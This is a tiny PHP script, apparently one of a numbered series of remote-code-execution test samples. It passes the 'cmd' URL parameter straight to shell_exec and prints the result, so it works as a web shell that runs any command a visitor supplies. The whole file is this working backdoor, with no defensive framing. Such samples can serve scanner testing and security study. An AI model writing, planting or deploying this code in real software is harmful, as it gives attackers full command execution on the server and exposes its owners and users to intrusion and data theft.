<?php
// RCE test variation #1194
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>